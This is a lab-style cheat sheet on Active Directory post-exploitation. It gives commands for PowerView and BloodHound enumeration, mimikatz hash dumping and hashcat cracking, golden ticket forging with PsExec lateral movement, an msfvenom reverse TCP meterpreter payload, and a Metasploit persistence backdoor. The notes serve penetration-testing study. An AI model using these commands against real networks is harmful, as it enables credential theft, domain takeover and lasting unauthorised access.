# Post-Exploitation Basics

## Enumeration w/ Powerview

{% hint style="info" %}
After you have already gained a shell in the system.
{% endhint %}

```powershell
# Start PowerShell
powershell -ep bypass
# Start PowerView
. .\Downloads\PowerView.ps1
# Enumerate the domain users
Get-NetUser | select cn
# Enumerate the domain groups
Get-NetGroup -GroupName *admin*
```

Cheat Sheet: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## Enumeration w/ Bloodhound

### Getting loot w/ SharpHound

```powershell
powershell -ep bypass
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
# Transfer the loot.zip file back to Attack machine
```

### Mapping the network w/ BloodHound

```powershell
# Execute BloodHound
bloodhound
# Login with same credentials set with Neo4j
# From within BloodHound import the loot.zip file
# View the graphed network: Menu --> queries
```

## Dumping hashes w/ mimikatz

```powershell
mimikatz
privilege::debug
# Dump the hashes
lsadump::lsa /patch
# Crack the hashes
hashcat -m 1000 <hash> rockyou.txt
```

## Golden Ticket Attacks w/ mimikatz

### Dump the krbtgt Hash

```
mimikatz
privilege::debug
lsadump::lsa /inject /name:krbtgr
```

### Create a Golden Ticket

```powershell
# Syntax
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
# Example
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-... /krbtgt:78558f00... /id:500
```

### Use the Golden Ticket to access other machine

```powershell
# This will open a new command prompt with elevated privileges to all machines
misc::cmd
# Access other Machines! - You will now have another command prompt with access to all other machines on the network
dir \\Desktop-1\c$
PsExec.exe \\Desktop-1 cmd.exe
```

## Enumeration w/ Server Manager

This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.

Navigate to the tools tab and select the Active Directory Users and Computers

This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers

Some sys admins don't realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is

## Maintaining Access

### Generating a Payload w/ msfvenom

1. Generate a basic windows meterpreter reverse tcp shell\
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe`
2. Transfer the payload from your attacker machine to the target machine.
3. `use exploit/multi/handler` - this will create a listener on the port that you set it on.
4. Configure our payload to be a windows meterpreter shell: `set payload windows/meterpreter/reverse_tcp`
5. After setting your THM IP address as your "LHOST", start the listener with `run`
6. Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that
7. Verify that we've got a meterpreter shell, where we will then `background` it to run the persistence module.

### Run the Persistence Module

1. `use exploit/windows/local/persistence` this module will send a payload every 10 seconds in default however you can set this time to anything you want
2. `set session 1` set the session to the session that we backgrounded in meterpreter (you can use the `sessions` command in metasploit to list the active sessions)

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to `windows/meterpreter/reverse_tcp` allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.
